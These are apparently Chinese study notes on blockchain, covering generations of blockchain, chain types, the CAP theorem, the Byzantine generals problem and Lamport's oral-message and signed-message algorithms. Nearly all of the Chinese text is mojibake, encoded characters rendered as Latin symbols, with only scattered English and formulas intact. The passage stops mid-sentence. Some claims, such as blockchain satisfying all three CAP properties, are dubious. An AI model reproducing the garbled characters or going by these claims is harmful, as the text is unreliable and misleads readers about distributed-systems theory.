åŒºå—é“¾1.0\nâ€‹\tåŒºå—é“¾1.0æ˜¯éšç€æ¯”ç‰¹å¸çš„å‘æ˜è€Œå¼•å…¥ï¼ŒåŸºäºç”¨äºåŠ å¯†è´§å¸\n  åŒºå—é“¾2.0\nâ€‹\tä¸»è¦ç”¨äºé‡‘èæœåŠ¡ï¼Œåœ¨è¿™ä¸€é˜¶æ®µå¼•å…¥åˆåŒ\n  åŒºå—é“¾3.0\nâ€‹\tç”¨äºé‡‘èæœåŠ¡è¡Œä¸šä¹‹å¤–ï¼ŒåŒæ—¶è¿˜åŒ…æ‹¬æ”¿åºœã€å«ç”Ÿã€åª’ä½“ã€è‰ºæœ¯å’Œå¸æ³•ç­‰æ›´ç»¼åˆçš„è¡Œä¸š\n  Generation Xï¼ˆåŒºå—é“¾Xï¼‰\nâ€‹\tè¿™æ˜¯åŒºå—é“¾å‘å±•è¿‡ç¨‹ä¸­ä¸€ä¸ªå¥‡ç‚¹ï¼Œæœ‰ä¸€å¤©æˆ‘ä»¬å°†ä¼šæ‹¥æœ‰ä¸€ä¸ªå…¬å…±åŒºå—é“¾æœåŠ¡ï¼Œä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨ï¼Œè¿›è€Œåœ¨æ‰€æœ‰é¢†åŸŸæä¾›æœåŠ¡\n  ä¸‰ç§å…¸å‹æ¼”åŒ–åœºæ™¯\n   åœºæ™¯ åŠŸèƒ½ æ™ºèƒ½åˆçº¦ ä¸€è‡´æ€§ æƒé™ ç±»å‹ æ€§èƒ½ ç¼–ç¨‹è¯­è¨€ ä»£è¡¨     å…¬ä¿¡çš„æ•°å­—è´§å¸ è®°è´¦åŠŸèƒ½ ä¸å¸¦æœ‰æˆ–è¾ƒå¼± Pow æ—  å…¬æœ‰é“¾ è¾ƒä½ ç®€å•è„šæœ¬ æ¯”ç‰¹å¸ç½‘ç»œ   å…¬ä¿¡çš„äº¤æ˜“å¤„ç† æ™ºèƒ½åˆçº¦ å›¾çµå®Œå¤‡ PoWã€PoS æ—  å…¬æœ‰é“¾ å—é™ å¾…å®šè¯­è¨€ ä»¥å¤ªåŠç½‘ç»œ   å¸¦æƒé™çš„åˆ†å¸ƒå¼è´¦æœ¬å¤„ç† å•†ä¸šå¤„ç† å¤šç§è¯­è¨€ã€å›¾çµå®Œå¤‡ åŒ…CFTã€BFTåœ¨å†…çš„å¤šç§æœºåˆ¶ã€å¯æ’æ‹” æ”¯æŒ è”ç›Ÿé“¾ å¯æ‰©å±• é«˜çº§ç¼–ç¨‹è¯­è¨€ è¶…çº§è´¦æœ¬    æ¼”åŒ–å‡ºçš„å‡ ç§ç±»å‹ï¼š\n  å…¬æœ‰åŒºå—é“¾ï¼šå¯¹å…¬ä¼—å¼€æ”¾ï¼Œä»»ä½•äººéƒ½å¯ä»¥ä½œä¸ºèŠ‚ç‚¹å‚ä¸è¿›æ¥ã€‚ä»»ä½•äººä¸ä¼šæŒæœ‰è¯¥è´¦æœ¬ï¼Œè€Œä¸”å‘ä»»ä½•å‚ä¸è€…å¼€æ”¾ ç§æœ‰åŒºå—é“¾ï¼šä»…å‘ç‰¹å®šç»„ç»‡å¼€æ”¾ï¼Œè¿›è€Œç¡®å®šè´¦æœ¬çš„å…±äº«è¿‡ç¨‹ åŠç§æœ‰åŒºå—é“¾ï¼šå…¼å…·ç§æœ‰æ€§å’Œå…¬æœ‰æ€§ï¼Œç§æœ‰éƒ¨åˆ†ç”±æŸä¸€å›¢ä½“æ§åˆ¶ï¼Œè€Œå…¬æœ‰éƒ¨åˆ†åˆ™å‘å‚ä¸è€…å¼€æ”¾ ä¾§é“¾æŠ€æœ¯ï¼šåŒ…æ‹¬å•è·¯æ¥”å…¥å¼ä¾§é“¾å’ŒåŒè·¯æ¥”å…¥å¼ä¾§é“¾ã€‚é’ˆå¯¹åè€…ï¼Œè´§å¸å¯åœ¨ä¸»é“¾å’Œä¾§é“¾é—´ç§»åŠ¨ï¼Œå¹¶åœ¨å¿…è¦æ—¶è¿”å›è‡³ä¸»é“¾ è®¸å¯è´¦æœ¬ï¼šå‚ä¸è€…æ˜¯å·²çŸ¥ä¸”å—ä¿¡çš„ï¼Œè®¸å¯è´¦æœ¬ä¸éœ€è¦ä½¿ç”¨åˆ†å¸ƒå¼åå•†ä¸€è‡´æœºåˆ¶ï¼Œç›¸åï¼Œå¯ä»¥ä½¿ç”¨ä¸€è‡´æ€§åè®®æ¥ç»´æŠ¤å…±äº«è´¦æœ¬ åˆ†å¸ƒå¼è´¦æœ¬ï¼šåˆ†å¸ƒå¼è´¦æœ¬åˆ†å¸ƒåœ¨å‚ä¸è€…ä¹‹é—´ï¼Œå¹¶æ‰©æ•£äºå¤šä¸ªç«™ç‚¹æˆ–ç»„ç»‡ä¸­ã€‚å¯¹åº”çš„è®°å½•æ˜¯è¿ç»­å­˜å‚¨çš„ï¼Œè€Œä¸æ˜¯æŒ‰æƒ…å†µæ’åºçš„ å…±äº«è´¦æœ¬ï¼šå…±äº«çš„åº”ç”¨ç¨‹åºå’Œæ•°æ®åº“ å…¨ç§æœ‰å’Œä¸“æœ‰è´¦æœ¬ï¼šé€‚ç”¨äºç»„ç»‡å†…éƒ¨çš„ç‰¹å®šç§æœ‰ç¯å¢ƒå…±äº«æ•°æ®ï¼Œå¹¶æä¾›æ•°æ®çš„çœŸå®æ€§ä¿è¯ æ ‡è®°åŒ–åŒºå—é“¾ï¼šæ ‡å‡†çš„åŒºå—é“¾ï¼Œé€šè¿‡æŒ–æ˜å’Œåˆå§‹åˆ†å¸ƒæ¥ç”ŸæˆåŠ å¯†è´§å¸ æ— ä»£å¸åŒºå—é“¾ï¼šä¸éœ€åœ¨èŠ‚ç‚¹é—´ä¼ é€’å€¼ï¼Œåªéœ€åœ¨å—ä¿¡å„æ–¹ä¹‹é—´å…±äº«æ•°æ®   åŒºå—é“¾æ˜¯é¦–ä¸ªè‡ªå¸¦å¯¹è´¦åŠŸèƒ½çš„æ•°å­—è®°è´¦æŠ€æœ¯å®ç° è·Ÿä¼ ç»Ÿçš„è®°è´¦æŠ€æœ¯ç›¸æ¯”ï¼ŒåŸºäºåŒºå—é“¾çš„åˆ†å¸ƒå¼è´¦æœ¬åº”è¯¥åŒ…æ‹¬å¦‚ä¸‹ç‰¹ç‚¹ï¼š\n  ç»´æŠ¤ä¸€æ¡ä¸æ–­å¢é•¿çš„é“¾ï¼Œåªå¯èƒ½æ·»åŠ è®°å½•ï¼Œè€Œå‘ç”Ÿè¿‡çš„è®°å½•éƒ½ä¸å¯ç¯¡æ”¹\n  å»ä¸­å¿ƒåŒ–ï¼Œæˆ–è€…è¯´å¤šä¸­å¿ƒåŒ–ï¼Œæ— éœ€é›†ä¸­æ§åˆ¶è€Œèƒ½è¾¾æˆå…±è¯†ï¼Œå®ç°ä¸Šå°½é‡é‡‡ç”¨åˆ†å¸ƒå¼\n  é€šè¿‡å¯†ç å­¦çš„æœºåˆ¶æ¥ç¡®ä¿äº¤æ˜“æ— æ³•è¢«æŠµèµ–å’Œç ´åï¼Œå¹¶å°½é‡ä¿æŠ¤ç”¨æˆ·ä¿¡æ¯å’Œè®°å½•çš„éšç§æ€§\n  åˆ†ç±» æ ¹æ®å‚ä¸è€…çš„ä¸åŒï¼Œå¯ä»¥åˆ†ä¸ºå…¬å¼€ï¼ˆpublicï¼‰é“¾ã€è”ç›Ÿï¼ˆ consortiumï¼‰é“¾å’Œç§æœ‰ï¼ˆprivateï¼‰é“¾ã€‚\n å…¬æœ‰é“¾ï¼Œé¡¾åæ€ä¹‰ï¼Œä»»ä½•äººéƒ½å¯ä»¥å‚ä¸ä½¿ç”¨å’Œç»´æŠ¤ï¼Œå¦‚æ¯”ç‰¹å¸åŒºå—é“¾ï¼Œä¿¡æ¯æ˜¯å®Œå…¨å…¬å¼€çš„ï¼›  å¦‚æœè¿›ä¸€æ­¥å¼•å…¥è®¸å¯æœºåˆ¶ï¼Œå¯ä»¥å®ç°ç§æœ‰é“¾å’Œè”ç›Ÿé“¾ä¸¤ç§ç±»å‹ï¼š\n  ç§æœ‰é“¾ï¼Œç”±é›†ä¸­ç®¡ç†è€…è¿›è¡Œç®¡ç†é™åˆ¶ï¼Œåªæœ‰å†…éƒ¨å°‘æ•°äººå¯ä»¥ä½¿ç”¨ï¼Œä¿¡æ¯ä¸å…¬å¼€ï¼›\n  è”ç›Ÿé“¾åˆ™ä»‹äºä¸¤è€…ä¹‹é—´ï¼Œç”±è‹¥å¹²ç»„ç»‡ä¸€èµ·åˆä½œç»´æŠ¤ä¸€æ¡åŒºå—é“¾ï¼Œè¯¥åŒºå—é“¾çš„ä½¿ç”¨å¿…é¡»æ˜¯å¸¦æœ‰æƒé™çš„é™åˆ¶è®¿é—®ï¼Œç›¸å…³ä¿¡æ¯ä¼šå¾—åˆ°ä¿æŠ¤ï¼Œå¦‚ä¾›åº”é“¾æœºæ„æˆ–é“¶è¡Œè”ç›Ÿ ã€‚\n  åˆ†å¸ƒå¼ç³»ç»Ÿä¸å»ä¸­å¿ƒåŒ– åˆ†å¸ƒå¼ç³»ç»Ÿ   åŒºå—é“¾çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„åˆ†å¸ƒå¼ç³»ç»Ÿ\n  åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„èŠ‚ç‚¹å¯ä»¥ç›¸äº’äº¤æ¢ä¿¡æ¯\n  èŠ‚ç‚¹åˆ†ä¸ºå¯ä¿¡èŠ‚ç‚¹ã€ç¼ºé™·èŠ‚ç‚¹ã€æ¶æ„èŠ‚ç‚¹ã€‚ä¸€ä¸ªç”±ä»»æ„è¡Œä¸ºçš„èŠ‚ç‚¹è¢«ç§°ä¸ºæ‹œå åº­èŠ‚ç‚¹ï¼Œç½‘ç»œä¸ŠæŸä¸ªå‡ºç°ä»»ä½•æ„å¤–è¡Œä¸ºçš„èŠ‚ç‚¹éƒ½å¯å½’ç±»äºæ‹œå åº­èŠ‚ç‚¹ã€‚\n  åˆ†å¸ƒå¼ç³»ç»Ÿçš„ä¸»è¦æŒ‘æˆ˜ï¼šèŠ‚ç‚¹ä¸å®¹é”™çš„åè°ƒï¼Œå³ä¸€ä¸ªèŠ‚ç‚¹çš„å¤±æ•ˆä¸å½±å“æ•´ä¸ªç³»ç»Ÿçš„è¿è¡Œ\n  åŒæ­¥ç³»ç»Ÿï¼šSynchronous System: Known bounds on times for message transmission, processing , bounds on local clock drifts, etc.(Can use timeout)\n  å¼‚æ­¥ç³»ç»Ÿï¼šAsynchronous System: No known bounds on times for message transmission, processing, bounds on local clock drifts, etc.(More realistic, practical, but no timeout.)\n  CAPå®šç† capå®šç†ï¼Œåˆç§°å¸ƒé²å°”å®šç†ï¼šä»»æ„åˆ†å¸ƒå¼ç³»ç»Ÿä¸èƒ½åŒæ—¶æ‹¥æœ‰ä¸€è‡´æ€§ã€å¯ç”¨æ€§ã€åˆ†åŒºå®¹é”™æ€§\n ä¸€è‡´æ€§(Consistency)ï¼šä»»æ„èŠ‚ç‚¹æ‹¥æœ‰æœ€æ–°æ•°æ®å‰¯æœ¬ å¯ç”¨æ€§(Availablitiy)ï¼šç³»ç»Ÿåœ¨ä½¿ç”¨æœŸé—´å¯ä»¥è¢«è®¿é—®ï¼Œæ¥æ”¶è¯·æ±‚å¹¶åœ¨å¿…è¦æ—¶åšå‡ºå“åº” åˆ†åŒºå®¹é”™æ€§(Partition Tolerance)ï¼šä¸€ç»„èŠ‚ç‚¹çš„å¤±æ•ˆä¸å½±å“ç³»ç»Ÿçš„è¿è¡Œ  ä¸€èˆ¬æ˜¯æ·˜å®çš„ç³»ç»Ÿå¯ç”¨æ€§å¯ä»¥è¾¾åˆ°5ä¸ª9ï¼Œæ„æ€æ˜¯ä»–çš„å¯ç”¨æ°´å¹³æ˜¯99.999%ï¼Œå³å…¨å¹´åœæœºæ—¶é—´ä¸è¶…è¿‡(1-0.99999)*365*24*60 = 5.256min\n**CP without A **ï¼šä¸€æ—¦å‘ç”Ÿç½‘ç»œæ•…éšœæˆ–è€…æ¶ˆæ¯ä¸¢å¤±ç­‰æƒ…å†µï¼Œå°±è¦ç‰ºç‰²ç”¨æˆ·çš„ä½“éªŒï¼Œç­‰å¾…æ‰€æœ‰æ•°æ®å…¨éƒ¨ä¸€è‡´äº†ä¹‹åå†è®©ç”¨æˆ·è®¿é—®ç³»ç»Ÿã€‚åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿ(Redisã€Hbase),åˆ†å¸ƒå¼åè°ƒç»„ä»¶Zookeeper.\nAP wihtout Cï¼šè¦é«˜å¯ç”¨å¹¶å…è®¸åˆ†åŒºï¼Œåˆ™éœ€æ”¾å¼ƒä¸€è‡´æ€§ã€‚ä¸€æ—¦ç½‘ç»œé—®é¢˜å‘ç”Ÿï¼ŒèŠ‚ç‚¹ä¹‹é—´å¯èƒ½ä¼šå¤±å»è”ç³»ã€‚ä¸ºäº†ä¿è¯é«˜å¯ç”¨ï¼Œéœ€è¦åœ¨ç”¨æˆ·è®¿é—®æ—¶å¯ä»¥é©¬ä¸Šå¾—åˆ°è¿”å›ï¼Œåˆ™æ¯ä¸ªèŠ‚ç‚¹åªèƒ½ç”¨æœ¬åœ°æ•°æ®æä¾›æœåŠ¡ï¼Œè€Œè¿™æ ·ä¼šå¯¼è‡´å…¨å±€æ•°æ®çš„ä¸ä¸€è‡´æ€§ã€‚\næ·˜å®çš„è´­ç‰©ï¼Œ12306çš„ä¹°ç¥¨ï¼Œéƒ½æ˜¯åœ¨å¯ç”¨æ€§å’Œä¸€è‡´æ€§ä¹‹é—´èˆå¼ƒäº†å¯ç”¨æ€§è€Œé€‰æ‹©ä¸€è‡´æ€§ã€‚ä¿è¯äº†æœ€ç»ˆä¸€è‡´æ€§ã€‚\nç„¶è€ŒåŒºå—é“¾å¯ä»¥å®ç°è¿™ä¸‰ç§å±æ€§\n é€šè¿‡å¤åˆ¶çš„æ–¹å¼å®ç°å®¹é”™æ€§\né€šè¿‡ä¸€è‡´æ€§ç®—æ³•ç¡®ä¿æ‰€æœ‰èŠ‚ç‚¹å…·æœ‰ç›¸åŒçš„æ•°æ®\n æ‹œå åº­å°†å†›é—®é¢˜ ä¸€ç¾¤é¢†å¯¼æ‹œå åº­å„éƒ¨å†›é˜Ÿçš„é™†å†›å°†å†›ï¼Œè®¡åˆ’ä»æŸä¸€åŸå¸‚è¿›æ”»æˆ–æ’¤é€€ã€‚è¿™é‡Œï¼Œå°†å†›ä»¬ä¹‹é—´çš„å”¯ä¸€æ²Ÿé€šæ–¹å¼æ˜¯ä¿¡ä½¿ï¼Œä»–ä»¬éœ€è¦å°±åŒæ—¶è¿›æ”»è¾¾æˆä¸€è‡´æ„è§ï¼Œä»¥èµ¢å¾—èƒœåˆ©ã€‚\n**é—®é¢˜ï¼š**ä¸€åæˆ–å¤šåå°†å†›æˆ–è®¸æ˜¯å›å¾’ï¼Œå¯ä»¥ä¼ è¾¾ä¸€ä¸ªè¯¯å¯¼ä¿¡æ¯ã€‚å› æ­¤ï¼Œæœ‰å¿…è¦æ‰¾åˆ°ä¸€ç§å¯è¡Œçš„æœºåˆ¶ï¼Œè®©å°†å†›ä»¬ä¹‹é—´è¾¾æˆæŸç§åè®®ï¼Œè¿™æ ·å°±å¯ä»¥åŒæ—¶è¿›è¡Œæ”»å‡»ã€‚\nç›¸è¾ƒäºåˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå°†å†›å¯è§†ä½œèŠ‚ç‚¹ï¼Œå›å›½è€…åˆ™è§†ä½œæ‹œå åº­ï¼ˆæ¶æ„çš„ï¼‰èŠ‚ç‚¹ï¼Œä¿¡ä½¿æ˜¯å°†å†›ä¹‹é—´æ²Ÿé€šçš„æ¸ é“ã€‚\næ‹œå åº­å°†å†›å¤±æ•ˆ æ‰€è°“æ‹œå åº­å¤±æ•ˆæŒ‡ä¸€æ–¹å‘å¦ä¸€æ–¹å‘é€æ¶ˆæ¯ï¼Œå¦ä¸€æ–¹æ²¡æœ‰æ”¶åˆ°ï¼Œæˆ–è€…æ”¶åˆ°äº†é”™è¯¯çš„ä¿¡æ¯çš„æƒ…å½¢ã€‚\nåœ¨å®¹é”™çš„åˆ†å¸ƒå¼è®¡ç®—ä¸­ï¼Œæ‹œå åº­å¤±æ•ˆå¯ä»¥æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ç®—æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­çš„ä»»æ„ä¸€ä¸ªé”™è¯¯ã€‚è¿™äº›é”™è¯¯è¢«ç»Ÿç§°ä¸ºâ€œå´©æºƒå¤±æ•ˆâ€å’Œâ€œå‘é€ä¸é—æ¼å¼å¤±æ•ˆâ€ã€‚å½“æ‹œå åº­å¤±æ•ˆå‘ç”Ÿæ—¶ï¼Œç³»ç»Ÿå¯èƒ½ä¼šåšå‡ºä»»ä½•ä¸å¯é¢„æ–™çš„ååº”ã€‚\nè¿™äº›ä»»æ„çš„å¤±æ•ˆå¯ä»¥ç²—ç•¥åœ°åˆ†æˆä»¥ä¸‹å‡ ç±»ï¼š\n   è¿›è¡Œç®—æ³•çš„å¦ä¸€æ­¥æ—¶å¤±æ•ˆï¼Œå³å´©æºƒå¤±æ•ˆï¼›\n  æ— æ³•æ­£ç¡®æ‰§è¡Œç®—æ³•çš„ä¸€ä¸ªæ­¥éª¤ï¼›\n  æ‰§è¡Œäº†ä»»æ„ä¸€ä¸ªéç®—æ³•æŒ‡å®šçš„æ­¥éª¤ã€‚\n   å„ä¸ªæ­¥éª¤ç”±å„è¿›ç¨‹æ‰§è¡Œï¼Œç®—æ³•å°±æ˜¯ç”±è¿™äº›è¿›ç¨‹æ‰§è¡Œçš„ã€‚ä¸€ä¸ªé”™è¯¯çš„è¿›ç¨‹æ˜¯åœ¨æŸä¸ªç‚¹å‡ºç°äº†ä¸Šè¿°æƒ…å†µçš„è¿›ç¨‹ã€‚æ²¡æœ‰å‡ºç°é”™è¯¯çš„è¿›ç¨‹æ˜¯æ­£ç¡®çš„è¿›ç¨‹ã€‚\næ‹œå åº­å°†å†›é—®é¢˜â€”â€”è§£å†³ç®—æ³• æ‹œå åº­é—®é¢˜çš„æœ€åˆæè¿°æ˜¯ï¼šn ä¸ªå°†å†›è¢«åˆ†éš”åœ¨ä¸åŒçš„åœ°æ–¹ï¼Œå¿ è¯šçš„å°†å†›å¸Œæœ›é€šè¿‡æŸç§åè®®è¾¾æˆæŸä¸ªå‘½ä»¤çš„ä¸€è‡´ï¼ˆæ¯”å¦‚ä¸€èµ·è¿›æ”»æˆ–è€…ä¸€èµ·åé€€ï¼‰ã€‚ä½†å…¶ä¸­ä¸€äº›èƒŒå›çš„å°†å†›ä¼šé€šè¿‡å‘é€é”™è¯¯çš„æ¶ˆæ¯é˜»æŒ å¿ è¯šçš„å°†å†›è¾¾æˆå‘½ä»¤ä¸Šçš„ä¸€è‡´ã€‚Lamport è¯æ˜äº†åœ¨å°†å†›æ€»æ•°å¤§äº3m ï¼ŒèƒŒå›è€…ä¸ºm æˆ–è€…æ›´å°‘æ—¶ï¼Œå¿ è¯šçš„å°†å†›å¯ä»¥è¾¾æˆå‘½ä»¤ä¸Šçš„ä¸€è‡´ã€‚\n ä¸ºäº†ä¿è¯ä¸Šé¢çš„éœ€æ±‚ï¼Œå¿…é¡»æ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶ï¼š  IC1. æ‰€æœ‰å¿ è¯šçš„å‰¯å®˜éµå®ˆç›¸åŒçš„å‘½ä»¤ï¼Œå³ä¸€è‡´æ€§ IC2. å¦‚æœå‘å‡ºå‘½ä»¤çš„å°†å†›æ˜¯å¿ è¯šçš„ï¼Œé‚£ä¹ˆæ‰€æœ‰å¿ è¯šçš„å‰¯å®˜éµå®ˆå¸ä»¤ï¼ˆå‘å‡ºå‘½ä»¤çš„å°†å†›ï¼‰çš„å‘½ä»¤ï¼Œå³æ­£ç¡®æ€§     ç‰¹åˆ«æç¤ºï¼š\nå‘é€å‘½ä»¤çš„æ¯æ¬¡åªæœ‰ä¸€ä¸ªå°†å†›ï¼Œå°†å…¶å‘½ä»¤å‘é€ç»™n-1 ä¸ªå‰¯å®˜ã€‚\nm ä»£è¡¨å›å›½è€…çš„ä¸ªæ•°ï¼Œå› ä¸ºå°†å†›æ€»æ•°ä¸ºnï¼Œæ‰€ä»¥å‰¯å®˜æ€»æ•°ä¸ºn-1 ä¸ªã€‚\nIC2 ä¸­å‰¯å®˜éµå®ˆå®é™…ä¸Šæ˜¯æŒ‡å¿ è¯šçš„å°†å†›èƒ½å¤Ÿæ­£ç¡®æ”¶åˆ°å¿ è¯šå°†å†›çš„å‘½ä»¤æ¶ˆæ¯ã€‚\n æ¶ˆæ¯ä¼ é€’  é€šè¿‡æ¶ˆæ¯ä¼ é€’è¾¾åˆ°ä¸€è‡´ï¼Œå¦‚æœæœ‰m ä¸ªå›å›½å°†å†›ï¼Œåˆ™å°†å†›ä»¬çš„æ€»æ•°å¿…é¡»ä¸º3m+1 ä¸ªä»¥ä¸Šã€‚ä¸‹é¢æ˜¯æ¶ˆæ¯ä¼ é€’è¿‡ç¨‹ä¸­é»˜è®¤çš„ä¸€äº›æ¡ä»¶ï¼š  A1. æ¯ä¸ªè¢«å‘é€çš„æ¶ˆæ¯éƒ½èƒ½å¤Ÿè¢«æ­£ç¡®çš„æŠ•é€’ A2. ä¿¡æ¯æ¥æ”¶è€…çŸ¥é“æ˜¯è°å‘é€çš„æ¶ˆæ¯ A3. èƒ½å¤ŸçŸ¥é“ç¼ºå°‘çš„æ¶ˆæ¯    A1 å’Œ A2 å‡è®¾äº†ä¸¤ä¸ªå°†å†›ä¹‹é—´é€šä¿¡æ²¡æœ‰å¹²æ‰°ï¼Œæ—¢ä¸ä¼šæœ‰èƒŒå›è€…é˜»ç¢æ¶ˆæ¯çš„å‘é€ï¼ˆæˆªæ–­ï¼‰ä¹Ÿä¸ä¼šæœ‰èƒŒå›è€…ä¼ªé€ æ¶ˆæ¯çš„æƒ…å†µï¼ˆä¼ªé€ ï¼‰ã€‚å³æ˜¯æ¯ä¸ªå°†å†›éƒ½å¯ä»¥æ— è¯¯åœ°å°†è‡ªå·±çš„æ¶ˆæ¯å‘é€ç»™å…¶ä»–æ¯ä¸ªå°†å†›ã€‚\nç®—æ³•  æ‹œå åº­å°†å†›é—®é¢˜ã€‚å£å¤´ç®—æ³•OM(n.m);n=3m+1\n OM(m)ç®—æ³•ï¼š\næ¶ˆæ¯ç®—æ³•OM(m) ã€‚å¯¹äºæ‰€æœ‰çš„éè´Ÿæ•´æ•°m ï¼Œæ¯ä¸ªå‘ä»¤è€…é€šè¿‡OM(M) ç®—æ³•å‘é€å‘½ä»¤ç»™n-1 ä¸ªå‰¯å®˜ã€‚ # å°†å†›é€šè¿‡å‰¯å®˜ä¼ é€’æ¶ˆæ¯:å³, æ¶ˆæ¯ä¼ é€’è·¯çº¿: å°†å†›i--Message--\u003eå‰¯å®˜i --boardcast--\u003eå‰¯å®˜j--Message--\u003eå°†å†›j ï¼ˆ1ï¼‰å‘ä»¤è€…å°†ä»–çš„å‘½ä»¤å‘é€ç»™æ¯ä¸ªå‰¯å®˜ã€‚ ï¼ˆ2ï¼‰å¯¹äºæ¯ä¸ªi ï¼Œvi æ˜¯æ¯ä¸ªå‰¯å®˜i ä»å‘ä»¤è€…æ”¶åˆ°çš„å‘½ä»¤ï¼Œå¦‚æœæ²¡æœ‰æ”¶åˆ°å‘½ä»¤åˆ™ä¸ºæ’¤é€€å‘½ä»¤ã€‚å‰¯å®˜i åœ¨OM(m-1) ä¸­ä½œä¸ºå‘ä»¤è€…å°†vi å‘é€ç»™å¦å¤–n-2 ä¸ªå‰¯å®˜ã€‚ ï¼ˆ3ï¼‰å¯¹äºæ¯ä¸ªiï¼Œå¹¶ä¸”j ä¸ç­‰äº iï¼Œvj æ˜¯å‰¯å®˜i ä»ç¬¬ï¼ˆ2ï¼‰æ­¥ä¸­çš„å‰¯å®˜j å‘é€è¿‡æ¥çš„å‘½ä»¤ï¼ˆä½¿ç”¨ OM(m-1)ç®—æ³•ï¼‰ï¼Œå¦‚æœæ²¡æœ‰æ”¶åˆ°ç¬¬ï¼ˆ2ï¼‰æ­¥ä¸­çš„å‰¯å®˜j çš„å‘½ä»¤åˆ™é»˜è®¤ä¸ºæ’¤é€€å‘½ä»¤ã€‚æœ€åå‰¯å®˜i ä½¿ç”¨majority(v1,â€¦,vn-1)å¾—åˆ°å‘½ä»¤ã€‚ å®šä¹‰majority(cmd1,cmd2,â€¦,cmdn)ç­‰äºå¤šæ•°æ´¾å‘½ä»¤ã€‚ ç¬¬ä¸€è½®å°†å†›å‘ç»™æ‰€æœ‰å‰¯å®˜å‘½ä»¤ ç¬¬äºŒè½®n-1å‰¯å®˜äº’é€šå°†å†›å‘äº†ä»€ä¹ˆ,ç¡®å®šå°†å†›æ˜¯å¦ä¸ºå›å¾’,è‹¥å°†å†›æ˜¯å›å¾’ï¼Œåˆ™å°†å†›çš„æ¶ˆæ¯æ— æ•ˆ,èˆå¼ƒ;å°†å†›å¿ è¯š,å³å¯åœ¨ç¬¬äºŒè½®å·²å¯å†³å®š ç¬¬ä¸‰è½®n-1å‰¯å®˜äº’é€šæŸä¸ªå‰¯å®˜å„ç»™åˆ«äººå‘äº†ä»€ä¹ˆæ¶ˆæ¯,éå†n-2ä¸ªå‰¯å®˜çš„æ¶ˆæ¯ä»¥åˆ¤æ–­è‡ªå·±ä½œä½•å†³å®š (ä¾‹:è‹¥L1æ”¶åˆ°å…¶å®ƒL2~L6å‘æ¥çš„Vj, ä½†æ˜¯ä»–è¦æ€€ç–‘å‡†ç¡®æ€§ï¼Œæ¯”å¦‚L1ä¼šæƒ³L2å‘ç»™è‡ªå·±æ˜¯å¦æ˜¯æ­£ç¡®çš„å‘¢ï¼Ÿé‚£ä¹ˆå°±è¿›å…¥ç¬¬ä¸‰è½®è¿›è¡ŒæŠ•ç¥¨.å› æ­¤è·Ÿåœ¨ç¬¬2è½®ä¹‹å,L1ä¼šä¾æ¬¡è¯¢é—®L3,4,5,6 ï¼Œé—®ä»–ä»¬ä¸Šä¸€è½®L2ç»™ä»–ä»¬å‘äº†ä»€ä¹ˆ,L1å¾—åˆ°ç¬¬äºŒè½®ä¸­L2-\u003eL3,L2-\u003eL4,L2-\u003eL5,L2-L6,å†ç»“åˆL2-\u003eL1ï¼Œä»5ä¸ªé‡Œç”¨majorityå‡½æ•°å†³å®šL2å‘äº†å•¥ï¼Œå†ä¾æ¬¡éå†L3-6,ç„¶åL1å®Œæˆç¬¬äºŒè½®çš„ç¡®è®¤) ç®—æ³•è¯æ˜ è¯¦ç»†çš„ç®—æ³•è¯æ˜å¯å‚è€ƒï¼š\n æ‹œå åº­å°†å†›ç™¾åº¦ç™¾ç§‘\nå¦‚ä½•ç†è§£æ‹œå åº­å°†å†›é—®é¢˜\n å®šç†1ï¼šå¯¹äºä»»æ„mï¼Œå¦‚æœæœ‰è¶…è¿‡3m ä¸ªå°†å†›å’Œæœ€å¤šm ä¸ªèƒŒå›è€…ï¼Œç®—æ³•OM(m) æ»¡è¶³æ¡ä»¶IC1 å’Œæ¡ä»¶IC2ã€‚\nå¼•ç†1ï¼šå¯¹äºä»»æ„m å’Œk ï¼Œå¦‚æœæœ‰è¶…è¿‡2k+m ä¸ªå°†å†›å’Œæœ€å¤šk ä¸ªèƒŒå›è€…ï¼Œé‚£ä¹ˆç®—æ³•OM(m) æ»¡è¶³IC2 ï¼ˆå›é¡¾ä¸‹IC2 æŒ‡çš„æ˜¯ï¼Œå¦‚æœå°†å†›æ˜¯å¿ è¯šçš„ï¼Œæ‰€æœ‰çš„å‰¯å®˜éµå®ˆå°†å†›å‘½ä»¤ï¼‰ã€‚\nç­¾åæ¶ˆæ¯ ç­¾åæ¶ˆæ¯åœ¨é™¤äº†æ»¡è¶³å£å¤´æ¶ˆæ¯A1-A3 ä¸‰ç‚¹è¦æ±‚å¤–è¿˜åº”è¯¥æ»¡è¶³ä¸‹é¢A4ï¼š\n  A4.\n ï¼ˆaï¼‰ç­¾åä¸å¯è¢«ä¼ªé€ ï¼Œä¸€æ—¦è¢«ç¯¡æ”¹å³å¯å‘ç° ï¼ˆbï¼‰ä»»ä½•äººéƒ½å¯ä»¥éªŒè¯å°†å†›ç­¾åçš„å¯é æ€§    choice() æ¥å†³å®šå‰¯å®˜çš„é€‰æ‹©ï¼š\n  å½“é›†åˆV åªåŒ…å«äº†ä¸€ä¸ªå…ƒç´ v ï¼Œé‚£ä¹ˆchoice(V)=v ï¼›\n  choice(Î¦)=RETREATã€‚\n  åŸºäºç­¾åæ¶ˆæ¯çš„ç®—æ³• SM(m)ç®—æ³•ï¼š\nåˆå§‹åŒ–Vi=ç©ºé›†åˆ ï¼ˆ1ï¼‰å°†å†›ç­¾ç½²å‘½ä»¤å¹¶å‘ç»™æ¯ä¸ªå‰¯å®˜ ï¼ˆ2ï¼‰å¯¹äºæ¯ä¸ªå‰¯å®˜i ï¼š ï¼ˆAï¼‰å¦‚æœå‰¯å®˜i ä»å‘ä»¤è€…æ”¶åˆ°v:0 çš„æ¶ˆæ¯ï¼Œä¸”è¿˜æ²¡æœ‰æ”¶åˆ°å…¶ä»–å‘½ä»¤åºåˆ—ï¼Œé‚£ä¹ˆï¼š ï¼ˆiï¼‰ä½¿Vi ä¸º{v} ï¼ˆiiï¼‰å‘é€v:0:i ç»™å…¶ä»–æ‰€æœ‰å‰¯å®˜ ï¼ˆBï¼‰å¦‚æœå‰¯å®˜i æ”¶åˆ°æ¶ˆæ¯v:0:j1:...:jk ä¸”v 